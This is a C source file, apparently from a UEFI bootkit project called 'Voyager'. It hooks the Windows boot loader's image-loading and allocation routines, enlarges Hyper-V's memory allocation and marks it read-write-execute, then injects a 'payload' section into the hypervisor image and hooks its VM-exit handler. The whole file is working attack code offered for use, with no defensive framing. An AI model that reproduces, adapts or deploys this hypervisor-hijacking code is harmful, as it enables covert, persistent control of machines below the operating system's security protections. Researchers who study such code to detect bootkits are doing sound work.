#include "HvLoader.h"

INLINE_HOOK HvLoadImageHook;
INLINE_HOOK HvLoadImageBufferHook;
INLINE_HOOK HvLoadAllocImageHook;
INLINE_HOOK TransferControlShitHook;

BOOLEAN HvExtendedAllocation = FALSE;
BOOLEAN HvHookedHyperV = FALSE;
MAP_PHYSICAL MmMapPhysicalMemory;

EFI_STATUS EFIAPI HvBlImgLoadPEImageFromSourceBuffer
(
	VOID* a1,
	VOID* a2,
	VOID* a3, 
	VOID* a4, 
	UINT64* ImageBase,
	UINT32* ImageSize, 
	VOID* a7,
	VOID* a8, 
	VOID* a9, 
	VOID* a10,
	VOID* a11,
	VOID* a12, 
	VOID* a13,
	VOID* a14,
	VOID* a15
)
{
	// disable hook and call the original...
	DisableInlineHook(&HvLoadImageBufferHook);
	EFI_STATUS Result = ((HV_LDR_LOAD_IMAGE_BUFFER)HvLoadImageBufferHook.Address)
	(
		a1,
		a2,
		a3,
		a4,
		ImageBase,
		ImageSize,
		a7,
		a8,
		a9,
		a10,
		a11,
		a12,
		a13,
		a14,
		a15
	);

	// keep hooking until we have extended hyper-v allocation and hooked into hyper-v...
	if(!HvExtendedAllocation && !HvHookedHyperV)
		EnableInlineHook(&HvLoadImageBufferHook);

	if (HvExtendedAllocation && !HvHookedHyperV)
	{
		HvHookedHyperV = TRUE;
		VOYAGER_T VoyagerData;

		// add a new section to hyper-v called "payload", then fill in voyager data
		// and hook the vmexit handler...
		MakeVoyagerData
		(
			&VoyagerData,
			*ImageBase,
			*ImageSize,
			AddSection
			(
				*ImageBase,
				"payload",
				PayLoadSize(),
				SECTION_RWX
			),
			PayLoadSize()
		);

		HookVmExit
		(
			VoyagerData.HypervModuleBase,
			VoyagerData.HypervModuleSize,
			MapModule(&VoyagerData, PayLoad)
		);

		// extend the size of the image in hyper-v's nt headers and LDR data entry...
		// this is required, if this is not done, then hyper-v will simply not be loaded...
		*ImageSize += NT_HEADER(*ImageBase)->OptionalHeader.SizeOfImage;
	}
	return Result;
}

EFI_STATUS EFIAPI HvBlImgLoadPEImageEx
(
	VOID* DeviceId,
	VOID* MemoryType, 
	CHAR16* Path,
	UINT64* ImageBase,
	UINT32* ImageSize,
	VOID* Hash,
	VOID* Flags,
	VOID* a8,
	VOID* a9, 
	VOID* a10,
	VOID* a11, 
	VOID* a12, 
	VOID* a13
)
{
	// disable shithook and call the original...
	DisableInlineHook(&HvLoadImageHook);
	EFI_STATUS Result = ((HV_LDR_LOAD_IMAGE)HvLoadImageHook.Address)
	(
		DeviceId,
		MemoryType, 
		Path, 
		ImageBase, 
		ImageSize, 
		Hash, 
		Flags,
		a8,
		a9,
		a10,
		a11, 
		a12, 
		a13
	);

	// keep hooking until we have extended hyper-v allocation and hooked into hyper-v...
	if(!HvExtendedAllocation && !HvHookedHyperV)
		EnableInlineHook(&HvLoadImageHook);

	if (HvExtendedAllocation && !HvHookedHyperV)
	{
		HvHookedHyperV = TRUE;
		VOYAGER_T VoyagerData;

		// add a new section to hyper-v called "payload", then fill in voyager data
		// and hook the vmexit handler...
		MakeVoyagerData
		(
			&VoyagerData,
			*ImageBase,
			*ImageSize,
			AddSection
			(
				*ImageBase,
				"payload",
				PayLoadSize(),
				SECTION_RWX
			),
			PayLoadSize()
		);

		HookVmExit
		(
			VoyagerData.HypervModuleBase,
			VoyagerData.HypervModuleSize,
			MapModule(&VoyagerData, PayLoad)
		);

		// extend the size of the image in hyper-v's nt headers and LDR data entry...
		// this is required, if this is not done, then hyper-v will simply not be loaded...
		*ImageSize = NT_HEADER(*ImageBase)->OptionalHeader.SizeOfImage;
	}
	return Result;
}

UINT64 EFIAPI HvBlImgAllocateImageBuffer
(
	VOID** imageBuffer, 
	UINTN imageSize,
	UINT32 memoryType,
	UINT32 attributes,
	VOID* unused, 
	UINT32 Value
)
{
	if (imageSize >= HV_ALLOC_SIZE && !HvExtendedAllocation)
	{
		HvExtendedAllocation = TRUE;
		imageSize += PayLoadSize();

		// allocate the entire hyper-v module as rwx...
		memoryType = BL_MEMORY_ATTRIBUTE_RWX;
	}

	// disable shithook and call the original function....
	DisableInlineHook(&HvLoadAllocImageHook);
	UINT64 Result = ((ALLOCATE_IMAGE_BUFFER)HvLoadAllocImageHook.Address)
	(
		imageBuffer, 
		imageSize,
		memoryType,
		attributes,
		unused, 
		Value
	);

	// continue shithooking this function until we have extended the allocation of hyper-v...
	if(!HvExtendedAllocation)
		EnableInlineHook(&HvLoadAllocImageHook);

	return Result;
}